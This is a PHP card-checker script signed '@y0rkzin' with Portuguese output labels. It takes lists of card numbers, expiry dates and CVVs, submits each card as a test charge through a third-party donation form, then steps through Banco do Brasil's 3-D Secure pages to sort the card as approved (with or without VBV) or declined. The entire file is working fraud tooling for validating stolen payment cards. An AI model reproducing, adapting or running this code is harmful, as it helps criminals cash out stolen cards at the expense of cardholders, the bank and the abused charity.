<?php

extract($_GET);
sleep(2);
error_reporting(0);
date_default_timezone_set('Brazil/East');
DeletarCookies();
$randCookie = rand(100000000, 999999999);
$loadtime = time();

function deletarCookies()
{
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
$cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, 4);
$cc3 = substr($cc, 8, 4);
$cc4 = substr($cc, 12, 4);
$bin = substr($lista, 0, 6);

switch ($ano) {
    case '2021':
        $ano = '21';
        break;
    case '2022':
        $ano = '22';
        break;
    case '2023':
        $ano = '23';
        break;
    case '2024':
        $ano = '24';
        break;
    case '2025':
        $ano = '25';
        break;
    case '2026':
        $ano = '26';
        break;
    case '2027':
        $ano = '27';
        break;
    case '2028':
        $ano = '28';
        break;
}

function puxarstring($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
#====================================================================================================#
//Hosts BB
if ($bin[0] == 4) {
    $host          = 'www58.bb.com.br';
    $auth          = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/auth.bb';
    $inicio        = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/inicio.bb';
    $customer      = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/customer.bb';
    $r_customer    = 'https://www58.bb.com.br/ThreeDSecureAuth/gcs/statics/gas/validacao.bb?urlRetorno=/ThreeDSecureAuth/vbvLogin/customer.bb';
} else {
    $host          = 'www66.bb.com.br';
    $auth          = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/auth.bb';
    $inicio        = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/inicio.bb';
    $customer      = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/customer.bb';
    $r_customer    = 'https://www66.bb.com.br/SecureCodeAuth/gcs/statics/gas/validacao.bb?urlRetorno=/SecureCodeAuth/scdLogin/customer.bb';
}

//bin
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://localhost/Painel/Checkers/bin.php?bin=' . $bin . '');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin11 = curl_exec($ch);

#====================================================================================================#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.kuranhalkalari.org/bagis/Payment.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-G532MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6,hu;q=0.5'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'fon=9&bagis_turu=4&bagis_bolgesi=8&name=EOS+CENTER&gsm=53283891932&mail=eoscenter%40ig.com&note=nd&adet=1&price=10&card_a=' . $cc1 . '&card_b=' . $cc2 . '&card_c=' . $cc3 . '&card_d=' . $cc4 . '&month=' . $mes . '&year=' . $ano . '&cvv=' . $cvv . '');
echo $est3Dgate = curl_exec($ch);

$PaReq = puxarstring($est3Dgate, 'value="', '"');
$TermUrl = puxarstring($est3Dgate, 'name="TermUrl" value="', '"');
$lixo = puxarstring($est3Dgate, 'name="MD"', '>');
$MD = puxarstring($lixo, 'value="', '"');


if ($PaReq == "") {
    echo '<span class="badge badge-danger">REPROVADA</span> <span style="color: black;"> → ' . $lista . ' <span class="badge badge-info">Retorno:</span> [ PaReq não Encontrado! ]</span></br>';
    exit();
}

//Auth
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $auth);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . './cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . './cookie.txt');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: ' . $host . '',
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,id;q=0.6,es;q=0.5'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'PaReq=' . urlencode($PaReq) . '&TermUrl=' . urlencode($TermUrl) . '&MD=' . urlencode($MD) . '');
$Auth = curl_exec($ch);

//Inicio
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $inicio);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . './cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . './cookie.txt');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: ' . $host . '',
    'Origin: https://' . $host . '',
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer: ' . $auth . '',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,id;q=0.6,es;q=0.5'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'TermUrl=' . urlencode($TermUrl) . '&PaReq=' . urlencode($PaReq) . '&MD=' . urlencode($MD) . '');
$Inicio = curl_exec($ch);

if (strpos($Inicio, 'Abra o aplicativo do BB em seu smartphone')) {
    echo '<span class="badge badge-success"> Aprovada </span> <span style="color: black;"> → <span class="badge badge-light">' . $cc . ' » ' . $mes . ' » ' . $ano . ' » ' . $cvv . '</span> | <span class="badge badge-info">' . $bin11 . '</span> <span class="badge badge-success">[ VBV QRCODE ]</span> | <span class="badge badge-dark">@y0rkzin</span></br>';

    exit();
} elseif (strpos($Inicio, 'Ocorreu um erro durante o processamento de sua')) {
    echo '<span class="badge badge-danger">REPROVADA</span> <span style="color: black;"> → ' . $lista . ' <span class="badge badge-info">Retorno:</span> [ Transação recusada! ]</span></br>';
    exit();
}

//Custumer
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $customer);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . './cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . './cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: ' . $host . '',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer: ' . $r_customer . '',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,id;q=0.6,es;q=0.5'
));
$Custumer = curl_exec($ch);

if (strpos($Custumer, 'Prezado cliente, voc&ecirc; n&atilde;o possui o M&oacute')) {
    echo '<span class="badge badge-success"> Aprovada </span> <span style="color: black;"> → <span class="badge badge-light">' . $cc . ' » ' . $mes . ' » ' . $ano . ' » ' . $cvv . '</span> | <span class="badge badge-info">' . $bin11 . '</span> <span class="badge badge-success">[ SEM VBV ]</span> | <span class="badge badge-dark">@y0rkzin</span></br>';

    exit();
} elseif (strpos($Custumer, 'Selecione um celular para receber ')) {
    echo '<span class="badge badge-success"> Aprovada </span> <span style="color: black;"> → <span class="badge badge-light">' . $cc . ' » ' . $mes . ' » ' . $ano . ' » ' . $cvv . '</span> | <span class="badge badge-info">' . $bin11 . '</span> <span class="badge badge-success">[ VBV SMS ]</span> | <span class="badge badge-dark">@y0rkzin</span></br>';

    exit();
} else {
    echo '<span class="badge badge-danger">REPROVADA</span> <span style="color: black;"> → ' . $lista . ' <span class="badge badge-info">Retorno:</span> [ Outro Erro! ]</span></br>';
    exit();
}
